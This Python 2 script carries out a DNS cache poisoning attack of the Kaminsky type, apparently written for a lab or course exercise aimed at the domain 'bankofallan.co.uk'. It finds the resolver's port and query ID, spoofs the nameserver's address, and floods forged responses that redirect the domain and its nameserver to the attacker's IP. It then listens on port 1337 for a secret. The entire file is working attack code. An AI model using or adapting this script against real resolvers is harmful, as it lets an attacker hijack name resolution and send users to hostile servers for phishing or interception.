import socket
import struct
from dnslib import *
from multiprocessing import Process
from multiprocessing import Event
from time import sleep
UDP_IP = "192.168.1.40" #my ip
UDP_PORT = 53
DNS_IP="192.168.1.113" #
SECRET_PORT = 1337

SRC_PORT = 0
Q_ID  = 0


def get_port():

	# GET PORT AND QUERY ID
	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_send.connect((DNS_IP, 53))


	socket_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_receive.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_receive.bind((UDP_IP, 53))


	query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("badguy.ru"))
	socket_send.send(query.pack())
	socket_send.close()
 	data, (host, src_port) = socket_receive.recvfrom(2048)
	data = DNSRecord.parse(data)
	qid = data.header.id

	socket_receive.close()

	return (qid, src_port)


def get_ns():
	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_send.connect((DNS_IP, 53))
	query_ns = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("ns.bankofallan.co.uk",QTYPE.NS))
	socket_send.send(query_ns.pack())

	data, address = socket_send.recvfrom(2048)
	data = DNSRecord.parse(data)
	ns = data.get_a().rdata
	socket_send.close()
	return str(ns)


def listening(event):
	final_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	final_socket.bind((UDP_IP, SECRET_PORT))
	print "Listening..."
	while True:
		data, address = final_socket.recvfrom(2048)
		print "Secret received! Here it is:", data
		event.set()
		break



def request_flooding_new():
	qid, port = get_port()
	ns = get_ns()
	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock_send.connect((DNS_IP, 53))
	domain = "bankofallan.co.uk"
	while True:
		rand_token = str(random.choice(range(0,10000)))
		dominio = rand_token +"."+domain
		sock_spoof = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock_spoof.bind((ns, 53))
		sock_spoof.connect((DNS_IP, port))
		query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion(dominio))#"random.bankofallan.co.uk"))
		sock_send.send(query.pack())
		for i in range(0,50):
			q_id = qid + i
			query = DNSRecord(DNSHeader(qr=1,ra=1,id=q_id,aa=1), q=DNSQuestion(dominio))#"random.bankofallan.co.uk"))
			answer = query.reply()
			answer.add_answer(RR(dominio,QTYPE.A,rdata=A(UDP_IP),ttl=4800))
			answer.add_auth(RR(dominio,QTYPE.NS,rdata=NS("ns.mydomain.ru"),ttl=4800))
			answer.add_ar(RR("ns.mydomain.ru",QTYPE.A,rdata=A(UDP_IP),ttl=4800))
			#aggiungere auth. NS bank of allan > type NS > domain name
			#aggiungere additional section domain name record A my ip
			#controllare flag DNSHeader
			sock_spoof.send(answer.pack())
			#print "Trying QID %s..." % q_id
		qid, port = get_port()








if __name__=="__main__":
	list = []
	event = Event()
	p1 = Process(target=request_flooding_new)
	p1.start()
	list.append(p1)


	p3 = Process(target=listening, args=(event,))
	p3.start()
	list.append(p3)

	p1.join()
	p3.join()

	while True:
		if event.is_set():
			print "Done..."
			for i in list:
				i.terminate()
		break
